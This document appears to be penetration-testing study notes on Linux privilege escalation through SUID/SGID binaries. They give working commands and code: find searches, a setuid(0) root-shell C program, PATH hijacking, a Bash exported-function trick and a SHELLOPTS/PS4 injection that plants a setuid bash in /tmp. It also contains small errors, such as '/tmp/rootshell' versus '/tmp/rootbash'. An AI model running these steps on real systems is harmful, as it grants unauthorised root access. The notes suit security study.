# Privileges Escalation - Linux
# Exploiting SUID/SGID 

- [Definitions](#definitions)
- [Where are these bits?](#wherearethesebits)
- [Finding SUID/SGID executables](#Finding-SUIDSGID-executables)
- [Shared objects vulnerability](#Shared-objects-vulnerability)
- [Environment variables without full paths](#Environment-variables-without-full-paths)
- [Environment variables with full paths and vulnerable shell](#Environment-variables-with-full-paths-and-vulnerable-shell)

## Definitions
- **SUID**: **Set User ID**. When a binary has the SUID bit set, anyone who runs it does so with the permissions of the file's owner, usually **root**. Useful for allowing users to run programs that require elevated privileges without giving full root access.
- **SGID**: **Set Group ID**. When a binary has the SGID bit set, anyone who runs it does so with the file's group (not the caller's).

## Where are these bits?
If we run the `ls -l` command, this output will be shown:<br> `<Obj Type><User permissions>-<Group permissions> <Obj Owner> <Obj Group>`<br>
(`Obj Type` could be `.` if it's a file or `d` if it's a directory).<br>
So, if we have an `s` in `User permissions`, the file has the SUID bit set. <br>If we have an `s` in `Grpup permissions`, the file has the SGID bit set.

## Finding SUID/SGID executables
- `find / -type f -perm /6000`: finds binaries which have the SUID **or** SGID bit set.
- `find / -type f -perm -6000`: finds binaries which have **both** the SUID **and** SGID bit set.
- `find / -type f -perm -4000`: finds binaries which have **only** the SUID bit set.
- `find / -type f -perm -2000`: finds binaries which have **only** the SGID bit set.

Type `2>/dev/null` in the end to discard the standard error.<br>
If we look for binaries and we find an obsolete one (so vulnerable, for example `/usr/sbin/exim-4.84-3`):
- Search those versions on https://exploit-db.com or somewhere else, for example Github.
- Copy the exploit and paste it on a `.sh` file, to make it runnable.
- Then run it to escalate privileges. Check if we became **root** with `whoami`.

## Shared objects vulnerability
Some binaries could be vulnerable to shared objects injections.
- `strace <Binary Path> 2>&1 | grep -iE "open|access|no such file"` to look for missing dependencies.
- If we find a missing file from an accessible location (for example the `/home` directory), we could create it and place a root shell in it.

## Environment variables without full paths
Some binaries could have readable sequences of characters and they can be exploited, because they inherit the user's PATH environment variable and they attempt to execute programs without specifying an absolute path.
- `strings <Binary Path>` to look for readable ASCII or Unicode characters. If we find some interesting stuffs like (for example) `system` and `service` **without** its full path (`/usr/sbin/service`):
  - We can exploit it creating a `.c` program:
    ```
    int main() {
            setuid(0);  
            system("/bin/bash -p"); 
    }
    ```
    In which:
      - `setuid(0)` => root id.
      - `system` => command to exploit.
      - `/bin/bash -p` => privileged shell.
  - Let's compile it to make an executable file, called exactly as the command we are going to exploit: `gcc <name>.c -o service`
  - In the end, we have to tell the binary "I want you to look for `service` in my own path first, then in the others", so `PATH=.:$PATH <Binary Path>`:
    - `.` => our current directory.
    - `:$PATH` => join the original path.
  - Now, running the binary we should be able to gain access to a root shell. Check it with `whoami`.

## Environment variables with full paths and vulnerable shell
Check the shell version, for example with `/bin/bash --version` (if the shell is Bash). 
<br>If the version is **below** 4.2-048, it's vulnerable and we can exploit shell functions with names that resemble file paths.
- If the previous `service` is defined **with** its full path (`/usr/sbin/service`), we can exploit it through the shell vulnerability.
- So let's create a custom function that executes bash code:
  - `function /usr/sbin/service { /bin/bash -p; }` to run a root shell
  - `export -f /usr/sbin/service`
- Now, running the binary we should be able to gain access to a root shell. Check it with `whoami`.

If the shell version is **above** that one, anyway it will read `SHELLOPTS` and `PS4` variables before removing the SUID privileges (known bug). So we can exploit it with:
  - `env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' <Binary Path>` in which:
    - `env -i` executes a program in an empty environment, without inheriting any variables.
    - `SHELLOPTS=xtrace` turns on the debug mode.
    - `PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)'` sets a debugging prompt, that will be printed before each command.
      - It copies the Bash shell in the `/tmp` directory and gives it execution permissions with UID = 0 (root)
- Now, running the shell with `/tmp/rootshell`, we should be able to gain access to a root shell. Check it with `whoami`.     













